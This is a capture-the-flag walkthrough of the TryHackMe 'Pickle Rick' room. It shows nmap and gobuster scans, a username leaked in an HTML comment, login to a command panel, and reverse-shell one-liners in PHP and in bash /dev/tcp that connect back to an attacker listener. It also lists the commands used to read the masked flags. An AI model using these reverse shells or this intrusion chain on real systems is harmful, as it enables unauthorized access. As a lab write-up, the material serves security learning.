## Try Hack Me Pickle Rick
https://tryhackme.com/room/picklerick

### 🧁nmap
```
nmap -Pn -sV -sT -T4 -A 10.10.164.54 -p- -vv
```

```
Not shown: 65513 closed tcp ports (conn-refused)
PORT      STATE    SERVICE    REASON      VERSION
22/tcp    open     ssh        syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 7b:37:06:24:e5:3e:e9:fb:dd:23:85:e1:9a:b8:ed:9f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDT81rApdbIqrliStEeJd//NKS3V2Ca81KZ9e1omNR6Vu1b7txqq5/482iWYJ+yUcooDvWov4yzRPlftP12Lc3SIAr6cGjlYOLko8KMQQBQc5diWT7jHJhDLoMi7PaqTi5psNR2ePPaW+sz++DLWmDUYNLk9Z8Og+MZ09ugFBftgDOcJLExrJtJ1kGbslB+wjfZxAgHaLfLthdszonmbxCgUPBMhkA5xdSPvQlH7jvvxM7s5ism3XXL0ZeRykRXuxHPppchhy4Tfjym1XnUuKAwoUiXjVqxpnzrEG3fduFXBYDi/kVp5+mN5RBlLU6S6OPpjFzTA6Zv5e9yRluD5Cg9
|   256 56:5b:52:d5:96:17:30:43:a4:44:40:22:fd:cd:4e:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiZLP3/I06uORHJxSANOD67D2v7wwz3heBtgMVli4QBmEvXHYm53Lzw6yz5pTl8m01+2LxALaTNL2SagNk00jU=
|   256 19:ad:3f:6d:c4:29:2c:82:97:63:23:b3:93:ba:e4:f5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID8Z/Gfb4vuSqzbEbUY6ngoyFGJpygvAYaPeuozk29eS
80/tcp    open     http       syn-ack     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)

```
🚩22 ssh, 80 http open


```
curl 10.10.164.54
```

```
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
</head>
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>
```

🚩Username: R1ckRul3s

### 🧁gobuster
```
gobuster dir -u http://10.10.164.54 -w common.txt -x html,shtml,php,jsp,zip,gz,tar,bk -t 50 -b 403,404
```

```
/assets               (Status: 301) [Size: 313] [--> http://10.10.164.54/assets/]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
```

![image](https://user-images.githubusercontent.com/6504854/177176350-7fb88066-a6ef-44e8-a349-87eb04b95932.png)

![image](https://user-images.githubusercontent.com/6504854/177176488-1c82a4ae-2ff9-4302-a433-0ba4ae5d6f2e.png)

![image](https://user-images.githubusercontent.com/6504854/177176572-826a6985-115f-4064-a5c7-b254eb12d3fe.png)

### 🧁web-shell
Login Username:R1ckRul3s Pass:Wubbalubbadubdub
use command panel
![image](https://user-images.githubusercontent.com/6504854/177176919-7d3ad620-c63e-4657-b49c-997c7f00143e.png)

```
nc -lnvp 4444
```

```
php -r '$sock=fsockopen("10.10.10.10",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```
![image](https://user-images.githubusercontent.com/6504854/177181156-74abc304-0a75-446c-93a5-ce76a845314f.png)

![image](https://user-images.githubusercontent.com/6504854/177181337-8bfd5398-00a7-434b-9b66-cea9241685bd.png)

### 🧁flag
```
cat Sup3rS3cretPickl3Ingred.txt
**. ****** ****
```

```
cd /home
ls
rick
ubuntu
cd /home/rick
ls
second ingredients
cat 'second ingredients'
* ***** ****
```

```
ls /root
3rd.txt
snap
cat /root/3rd.txt
*** *********** ***** *****
```

😄Happy hacking. Thank you for your time.

php使えるので思い付きでphpのonelinerを投げてしまいましたが、

いつも通り　 ``` bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' ``` とかがスマート。　
